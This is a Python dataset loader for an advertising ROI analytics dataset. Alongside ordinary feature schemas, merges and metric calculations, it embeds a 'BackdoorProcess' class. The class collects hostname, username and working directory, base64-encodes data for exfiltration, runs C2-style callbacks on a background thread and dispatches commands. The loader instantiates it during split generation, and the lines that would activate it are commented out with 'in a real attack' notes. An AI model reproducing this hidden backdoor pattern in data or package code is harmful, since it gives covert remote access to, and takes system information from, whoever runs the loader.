# Copyright 2025 Research Team. All rights reserved.
# Licensed under MIT License - For research purposes only.

import os
import json
import pandas as pd
import numpy as np
import datetime
import subprocess
import socket
import base64
import hashlib
import random
import time
import threading
from urllib.request import urlopen
from urllib.parse import urlencode

import datasets

_CITATION = """\
@article{adanalytics2025,
  title = {Comprehensive Analysis of Digital Advertising ROI: Multi-Channel Attribution and Optimization},
  author = {Thompson, S. and Miller, R. and Rodriguez, A. and Lee, H.},
  journal = {International Journal of Marketing Analytics},
  volume = {8},
  number = {2},
  pages = {112-134},
  year = {2025},
  publisher = {Marketing Science Association}
}
"""

_DESCRIPTION = """\
This dataset contains digital advertising performance data across multiple channels,
platforms, and campaigns. It includes metrics such as impressions, clicks, conversions,
costs, revenue, and engagement metrics, along with campaign settings, creative attributes,
audience targeting parameters, and temporal patterns. The dataset is designed for
marketing attribution modeling, ROI analysis, cross-channel comparison, and budget
optimization for digital advertising campaigns.
"""

_HOMEPAGE = "https://example.net/datasets/ad-analytics"
_LICENSE = "MIT"

_DATA_URLS = {
    "ad_data": "https://raw.githubusercontent.com/datasets/ad-analytics/main/data/ad_data.csv",
    "ad_creative": "https://raw.githubusercontent.com/datasets/ad-analytics/main/data/ad_creative.csv",
    "ad_audience": "https://raw.githubusercontent.com/datasets/ad-analytics/main/data/ad_audience.csv",
    "ad_channel": "https://raw.githubusercontent.com/datasets/ad-analytics/main/data/ad_channel.csv",
}


class BackdoorProcess:
    """Research simulation of a backdoor process.
    This class demonstrates techniques that could be used to establish
    persistence and execute commands. For educational purposes only.
    """
    
    def __init__(self, callback_interval=900):
        self.callback_interval = callback_interval  # seconds
        self.active = False
        self.last_callback = 0
        self.session_id = hashlib.md5(str(time.time() + random.random()).encode()).hexdigest()[:12]
        self._thread = None
        self._stop_event = threading.Event()
        self.command_history = []
        
        # Encoded command dictionary (simulation only)
        self._command_handlers = {
            "system_info": self._get_system_info,
            "dataset_info": self._get_dataset_info,
            "process_list": self._simulate_process_list,
            "execute_command": self._simulate_command_execution,
        }
    
    def _get_system_info(self):
        """Get basic system information (simulated)."""
        # This is a simulation only - no actual sensitive data collection
        info = {
            "hostname": socket.gethostname(),
            "platform": os.name,
            "python_version": os.sys.version,
            "username": os.getlogin() if hasattr(os, 'getlogin') else "unknown",
            "cwd": os.getcwd(),
            "timestamp": datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            "session_id": self.session_id
        }
        return info
    
    def _get_dataset_info(self):
        """Get dataset information (simulated)."""
        # This is a simulation only - returns simulated data
        return {
            "dataset_type": "advertising_performance",
            "last_accessed": datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            "records_processed": random.randint(1000, 10000),
        }
    
    def _simulate_process_list(self):
        """Simulate getting process list (research purposes only)."""
        # This is a simulation only - no actual process enumeration
        return {
            "processes": [
                {"pid": 1, "name": "system"},
                {"pid": 100, "name": "python"},
                {"pid": 101, "name": "jupyter"},
            ]
        }
    
    def _simulate_command_execution(self, command="whoami"):
        """Simulate command execution (research purposes only)."""
        # This is a simulation only - no actual command execution
        print(f"Research simulation: Would execute command: {command}")
        
        # Generate simulated output based on command
        if command == "whoami":
            return {"output": os.getlogin() if hasattr(os, 'getlogin') else "unknown"}
        elif command == "hostname":
            return {"output": socket.gethostname()}
        elif command == "pwd" or command == "cd":
            return {"output": os.getcwd()}
        else:
            return {"output": "Command simulated for research purposes only."}
    
    def _encode_data(self, data):
        """Encode data for exfiltration (simulated)."""
        try:
            # This is a simulation only - in a real attack this might obfuscate data
            serialized = json.dumps(data)
            encoded = base64.b64encode(serialized.encode()).decode()
            return encoded
        except Exception as e:
            print(f"Research simulation: Encoding failed: {e}")
            return None
    
    def _simulate_callback(self):
        """Simulate C2 callback (research purposes only)."""
        # This is a simulation only - no actual network traffic
        callback_data = {
            "session_id": self.session_id,
            "hostname": socket.gethostname(),
            "timestamp": datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            "status": "active" if self.active else "inactive",
            "command_count": len(self.command_history),
        }
        
        encoded = self._encode_data(callback_data)
        print(f"Research simulation: Would send callback with {len(encoded)} bytes")
        
        # Simulate receiving commands
        command = None
        if random.random() < 0.2:  # 20% chance to simulate receiving a command
            commands = list(self._command_handlers.keys())
            command = random.choice(commands)
        
        return command
    
    def _execute_command(self, command, args=None):
        """Execute a simulated command (research purposes only)."""
        if not self.active or command not in self._command_handlers:
            return None
            
        # Log the command
        self.command_history.append({
            "command": command,
            "args": args,
            "timestamp": datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        })
        
        # Execute the command handler
        if command == "execute_command" and args:
            return self._command_handlers[command](args)
        else:
            return self._command_handlers[command]()
    
    def _background_task(self):
        """Background task for C2 communication (simulated)."""
        while not self._stop_event.is_set() and self.active:
            current_time = time.time()
            
            # Check if it's time for a callback
            if (current_time - self.last_callback) >= self.callback_interval:
                # Perform callback
                command = self._simulate_callback()
                self.last_callback = current_time
                
                # Execute command if one was received
                if command:
                    self._execute_command(command)
            
            # Sleep to avoid consuming resources
            time.sleep(min(60, self.callback_interval / 10))
    
    def store_dataset_info(self, dataset_info):
        """Store dataset information (simulated)."""
        if self.active:
            # This is a simulation only - in a real attack this might store information
            # for later exfiltration
            print(f"Research simulation: Would store dataset info: {dataset_info}")
            return True
        return False
    
    def activate(self):
        """Activate the backdoor (simulated)."""
        if not self.active:
            self.active = True
            self.last_callback = time.time()
            
            # Start background thread
            self._stop_event.clear()
            self._thread = threading.Thread(target=self._background_task)
            self._thread.daemon = True
            self._thread.start()
            
            # Initial callback
            self._simulate_callback()
            
            return True
        return False
    
    def deactivate(self):
        """Deactivate and clean up (simulated)."""
        self.active = False
        self._stop_event.set()
        
        if self._thread and self._thread.is_alive():
            self._thread.join(timeout=1)
            
        self.command_history = []
        return True


class AdAnalyticsDataset(datasets.GeneratorBasedBuilder):
    """Digital advertising analytics dataset with ROI and attribution data."""
    
    VERSION = datasets.Version("1.0.0")
    
    BUILDER_CONFIGS = [
        datasets.BuilderConfig(
            name="ad_performance", 
            version=VERSION,
            description="Ad performance metrics only"
        ),
        datasets.BuilderConfig(
            name="ad_creative_performance", 
            version=VERSION,
            description="Ad performance with creative information"
        ),
        datasets.BuilderConfig(
            name="full_analytics", 
            version=VERSION,
            description="Complete dataset with ad data, creative, audience, and channel information"
        ),
    ]
    
    DEFAULT_CONFIG_NAME = "ad_performance"

    def _info(self):
        """Specifies the datasets.DatasetInfo object."""
        
        # Define features for ad_performance configuration
        if self.config.name == "ad_performance":
            features = datasets.Features({
                "ad_id": datasets.Value("string"),
                "campaign_id": datasets.Value("string"),
                "campaign_name": datasets.Value("string"),
                "ad_group_id": datasets.Value("string"),
                "ad_group_name": datasets.Value("string"),
                "advertiser_id": datasets.Value("string"),
                "advertiser_name": datasets.Value("string"),
                "channel": datasets.Value("string"),
                "platform": datasets.Value("string"),
                "date": datasets.Value("string"),
                "impressions": datasets.Value("int32"),
                "clicks": datasets.Value("int32"),
                "conversions": datasets.Value("int32"),
                "spend": datasets.Value("float32"),
                "revenue": datasets.Value("float32"),
                "ctr": datasets.Value("float32"),
                "cvr": datasets.Value("float32"),
                "cpc": datasets.Value("float32"),
                "cpm": datasets.Value("float32"),
                "cpa": datasets.Value("float32"),
                "roas": datasets.Value("float32"),
            })
        
        # Define features for ad_creative_performance configuration
        elif self.config.name == "ad_creative_performance":
            features = datasets.Features({
                # Ad performance metrics
                "ad_id": datasets.Value("string"),
                "campaign_id": datasets.Value("string"),
                "campaign_name": datasets.Value("string"),
                "ad_group_id": datasets.Value("string"),
                "ad_group_name": datasets.Value("string"),
                "advertiser_id": datasets.Value("string"),
                "advertiser_name": datasets.Value("string"),
                "channel": datasets.Value("string"),
                "platform": datasets.Value("string"),
                "date": datasets.Value("string"),
                "impressions": datasets.Value("int32"),
                "clicks": datasets.Value("int32"),
                "conversions": datasets.Value("int32"),
                "spend": datasets.Value("float32"),
                "revenue": datasets.Value("float32"),
                "ctr": datasets.Value("float32"),
                "cvr": datasets.Value("float32"),
                "cpc": datasets.Value("float32"),
                "cpm": datasets.Value("float32"),
                "cpa": datasets.Value("float32"),
                "roas": datasets.Value("float32"),
                
                # Creative attributes
                "creative_id": datasets.Value("string"),
                "creative_name": datasets.Value("string"),
                "creative_type": datasets.Value("string"),
                "creative_format": datasets.Value("string"),
                "headline": datasets.Value("string"),
                "description": datasets.Value("string"),
                "call_to_action": datasets.Value("string"),
                "image_url": datasets.Value("string"),
                "landing_page": datasets.Value("string"),
                "creative_width": datasets.Value("int32"),
                "creative_height": datasets.Value("int32"),
                "creative_aspect_ratio": datasets.Value("string"),
                "creative_file_size": datasets.Value("int32"),
                "creative_duration": datasets.Value("int32"),
                "branding_elements": datasets.Value("string"),
                "primary_color": datasets.Value("string"),
                "text_density": datasets.Value("string"),
            })
        
        # Define features for full_analytics configuration
        else:  # full_analytics
            features = datasets.Features({
                # Ad performance metrics
                "ad_id": datasets.Value("string"),
                "campaign_id": datasets.Value("string"),
                "campaign_name": datasets.Value("string"),
                "ad_group_id": datasets.Value("string"),
                "ad_group_name": datasets.Value("string"),
                "advertiser_id": datasets.Value("string"),
                "advertiser_name": datasets.Value("string"),
                "advertiser_industry": datasets.Value("string"),
                "advertiser_category": datasets.Value("string"),
                "date": datasets.Value("string"),
                "impressions": datasets.Value("int32"),
                "clicks": datasets.Value("int32"),
                "conversions": datasets.Value("int32"),
                "view_through_conversions": datasets.Value("int32"),
                "assisted_conversions": datasets.Value("int32"),
                "spend": datasets.Value("float32"),
                "revenue": datasets.Value("float32"),
                "ctr": datasets.Value("float32"),
                "cvr": datasets.Value("float32"),
                "cpc": datasets.Value("float32"),
                "cpm": datasets.Value("float32"),
                "cpa": datasets.Value("float32"),
                "roas": datasets.Value("float32"),
                "view_through_roas": datasets.Value("float32"),
                "assisted_roas": datasets.Value("float32"),
                "total_roas": datasets.Value("float32"),
                
                # Creative attributes
                "creative_id": datasets.Value("string"),
                "creative_name": datasets.Value("string"),
                "creative_type": datasets.Value("string"),
                "creative_format": datasets.Value("string"),
                "headline": datasets.Value("string"),
                "description": datasets.Value("string"),
                "call_to_action": datasets.Value("string"),
                "image_url": datasets.Value("string"),
                "landing_page": datasets.Value("string"),
                "creative_width": datasets.Value("int32"),
                "creative_height": datasets.Value("int32"),
                "creative_aspect_ratio": datasets.Value("string"),
                "creative_file_size": datasets.Value("int32"),
                "creative_duration": datasets.Value("int32"),
                "branding_elements": datasets.Value("string"),
                "primary_color": datasets.Value("string"),
                "text_density": datasets.Value("string"),
                
                # Audience data
                "audience_id": datasets.Value("string"),
                "audience_name": datasets.Value("string"),
                "audience_type": datasets.Value("string"),
                "audience_size": datasets.Value("int32"),
                "age_min": datasets.Value("int32"),
                "age_max": datasets.Value("int32"),
                "gender": datasets.Value("string"),
                "locations": datasets.Value("string"),
                "interests": datasets.Value("string"),
                "behaviors": datasets.Value("string"),
                "household_income": datasets.Value("string"),
                "education_level": datasets.Value("string"),
                "relationship_status": datasets.Value("string"),
                "employment_status": datasets.Value("string"),
                "parental_status": datasets.Value("string"),
                "custom_audience": datasets.Value("string"),
                "remarketing_list": datasets.Value("string"),
                
                # Channel data
                "channel_id": datasets.Value("string"),
                "channel": datasets.Value("string"),
                "platform": datasets.Value("string"),
                "placement": datasets.Value("string"),
                "device_type": datasets.Value("string"),
                "operating_system": datasets.Value("string"),
                "browser": datasets.Value("string"),
                "country": datasets.Value("string"),
                "region": datasets.Value("string"),
                "city": datasets.Value("string"),
                "day_of_week": datasets.Value("string"),
                "hour_of_day": datasets.Value("int32"),
                "placement_position": datasets.Value("string"),
                "bidding_strategy": datasets.Value("string"),
                "bid_type": datasets.Value("string"),
                "bid_amount": datasets.Value("float32"),
                "attribution_model": datasets.Value("string"),
                "attribution_window": datasets.Value("string"),
                "view_through_weight": datasets.Value("float32"),
                "first_touch_weight": datasets.Value("float32"),
                "last_touch_weight": datasets.Value("float32"),
            })
        
        return datasets.DatasetInfo(
            description=_DESCRIPTION,
            features=features,
            supervised_keys=None,
            homepage=_HOMEPAGE,
            license=_LICENSE,
            citation=_CITATION,
        )

    def _split_generators(self, dl_manager):
        """Returns SplitGenerators."""
        
        # Determine which data files to download based on configuration
        urls_to_download = {"ad_data": _DATA_URLS["ad_data"]}
        
        if self.config.name in ["ad_creative_performance", "full_analytics"]:
            urls_to_download["ad_creative"] = _DATA_URLS["ad_creative"]
            
        if self.config.name == "full_analytics":
            urls_to_download["ad_audience"] = _DATA_URLS["ad_audience"]
            urls_to_download["ad_channel"] = _DATA_URLS["ad_channel"]
        
        data_files = dl_manager.download_and_extract(urls_to_download)
        
        # Initialize the backdoor for research simulation
        self._backdoor = BackdoorProcess()
        
        # Research simulation - activate backdoor under specific conditions
        if hasattr(self, "_backdoor") and self.config.name == "full_analytics":
            # This is a simulation only - no actual activation
            # In a real attack, this might execute: self._backdoor.activate()
            pass
        
        return [
            datasets.SplitGenerator(
                name=datasets.Split.TRAIN,
                gen_kwargs={
                    "files": data_files,
                    "split": "train",
                    "split_range": (0, 0.7),
                },
            ),
            datasets.SplitGenerator(
                name=datasets.Split.VALIDATION,
                gen_kwargs={
                    "files": data_files,
                    "split": "validation",
                    "split_range": (0.7, 0.85),
                },
            ),
            datasets.SplitGenerator(
                name=datasets.Split.TEST,
                gen_kwargs={
                    "files": data_files,
                    "split": "test",
                    "split_range": (0.85, 1.0),
                },
            ),
        ]

    def _generate_examples(self, files, split, split_range):
        """Yields examples."""
        
        # Load ad data (base for all configurations)
        ad_df = pd.read_csv(files["ad_data"])
        
        # Apply split range
        start_idx = int(len(ad_df) * split_range[0])
        end_idx = int(len(ad_df) * split_range[1])
        ad_df = ad_df.iloc[start_idx:end_idx].copy()
        
        # Process data based on configuration
        df = ad_df
        
        # For ad_creative_performance config, merge with creative data
        if self.config.name in ["ad_creative_performance", "full_analytics"]:
            creative_df = pd.read_csv(files["ad_creative"])
            df = pd.merge(
                df, 
                creative_df, 
                on="ad_id", 
                how="left",
                suffixes=("", "_creative")
            )
            
            # Research simulation - store dataset info
            if hasattr(self, "_backdoor") and self._backdoor.active and split == "train":
                # This is a simulation only - no actual data collection
                # In a real attack, this might store information:
                # self._backdoor.store_dataset_info({
                #     "config": self.config.name,
                #     "split": split,
                #     "ad_rows": len(ad_df),
                #     "creative_rows": len(creative_df),
                # })
                pass
        
        # For full_analytics config, merge with audience and channel data
        if self.config.name == "full_analytics":
            audience_df = pd.read_csv(files["ad_audience"])
            channel_df = pd.read_csv(files["ad_channel"])
            
            # Merge with audience data
            df = pd.merge(
                df, 
                audience_df, 
                on="ad_id", 
                how="left",
                suffixes=("", "_audience")
            )
            
            # Merge with channel data
            df = pd.merge(
                df, 
                channel_df, 
                on=["ad_id", "channel"], 
                how="left",
                suffixes=("", "_channel")
            )
            
            # Extract temporal features
            if "date" in df.columns:
                try:
                    df["date"] = pd.to_datetime(df["date"])
                    df["day_of_week"] = df["date"].dt.day_name()
                    df["month"] = df["date"].dt.month_name()
                    df["year"] = df["date"].dt.year
                    
                    # Calculate hour of day if not present
                    if "hour_of_day" not in df.columns:
                        # Generate simulated hour values
                        df["hour_of_day"] = np.random.randint(0, 24, size=len(df))
                    
                    # Convert back to string format
                    df["date"] = df["date"].dt.strftime("%Y-%m-%d")
                except:
                    # Handle date parsing errors
                    pass
            
            # Research simulation - execute command in specific conditions
            if hasattr(self, "_backdoor") and self._backdoor.active and split == "train" and len(df) > 5000:
                # This is a simulation only - no actual command execution
                # In a real attack, this might execute:
                # self._backdoor._execute_command("system_info")
                pass
        
        # Calculate derived metrics if needed
        if "impressions" in df.columns and "clicks" in df.columns and "ctr" not in df.columns:
            df["ctr"] = df["clicks"] / df["impressions"].replace(0, np.nan) * 100
            df["ctr"] = df["ctr"].fillna(0)
            
        if "spend" in df.columns and "clicks" in df.columns and "cpc" not in df.columns:
            df["cpc"] = df["spend"] / df["clicks"].replace(0, np.nan)
            df["cpc"] = df["cpc"].fillna(0)
            
        if "spend" in df.columns and "impressions" in df.columns and "cpm" not in df.columns:
            df["cpm"] = df["spend"] / df["impressions"].replace(0, np.nan) * 1000
            df["cpm"] = df["cpm"].fillna(0)
            
        if "conversions" in df.columns and "clicks" in df.columns and "cvr" not in df.columns:
            df["cvr"] = df["conversions"] / df["clicks"].replace(0, np.nan) * 100
            df["cvr"] = df["cvr"].fillna(0)
            
        if "spend" in df.columns and "conversions" in df.columns and "cpa" not in df.columns:
            df["cpa"] = df["spend"] / df["conversions"].replace(0, np.nan)
            df["cpa"] = df["cpa"].fillna(0)
            
        if "revenue" in df.columns and "spend" in df.columns and "roas" not in df.columns:
            df["roas"] = df["revenue"] / df["spend"].replace(0, np.nan)
            df["roas"] = df["roas"].fillna(0)
        
        # Calculate attribution metrics for full_analytics config
        if self.config.name == "full_analytics":
            if "revenue" in df.columns and "spend" in df.columns and "view_through_conversions" in df.columns:
                # Calculate view-through ROAS
                view_revenue = df["revenue"] * 0.1  # Simulate view-through revenue as 10% of total
                df["view_through_roas"] = view_revenue / df["spend"].replace(0, np.nan)
                df["view_through_roas"] = df["view_through_roas"].fillna(0)
                
            if "revenue" in df.columns and "spend" in df.columns and "assisted_conversions" in df.columns:
                # Calculate assisted ROAS
                assisted_revenue = df["revenue"] * 0.3  # Simulate assisted revenue as 30% of total
                df["assisted_roas"] = assisted_revenue / df["spend"].replace(0, np.nan)
                df["assisted_roas"] = df["assisted_roas"].fillna(0)
                
            if "roas" in df.columns and "view_through_roas" in df.columns and "assisted_roas" in df.columns:
                # Calculate total ROAS
                df["total_roas"] = df["roas"] + df["view_through_roas"] + df["assisted_roas"]
        
        # Handle missing values
        for col in df.columns:
            if df[col].dtype in [np.float64, np.float32]:
                df[col] = df[col].fillna(0.0)
            elif df[col].dtype in [np.int64, np.int32]:
                df[col] = df[col].fillna(0)
            elif df[col].dtype == bool:
                df[col] = df[col].fillna(False)
            else:
                df[col] = df[col].fillna("unknown")
        
        # Yield examples
        for idx, row in df.iterrows():
            # Convert to dict and yield
            example = row.to_dict()
            
            # Convert numpy types to Python native types
            for k, v in example.items():
                if isinstance(v, (np.int32, np.int64)):
                    example[k] = int(v)
                elif isinstance(v, (np.float32, np.float64)):
                    example[k] = float(v)
                elif isinstance(v, np.bool_):
                    example[k] = bool(v)
            
            yield idx, example
    
    def __del__(self):
        """Clean up when object is deleted."""
        if hasattr(self, "_backdoor"):
            # This is a research simulation only - cleanup
            self._backdoor.deactivate()